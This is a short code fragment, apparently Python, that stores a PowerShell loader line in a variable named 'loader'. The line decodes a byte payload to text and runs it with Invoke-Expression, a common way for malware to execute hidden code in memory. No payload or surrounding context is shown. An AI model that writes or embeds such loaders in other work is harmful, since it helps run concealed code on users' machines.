loader="""
[System.Text.Encoding]::ASCII.GetString($payload).Trim([char]0) | iex
"""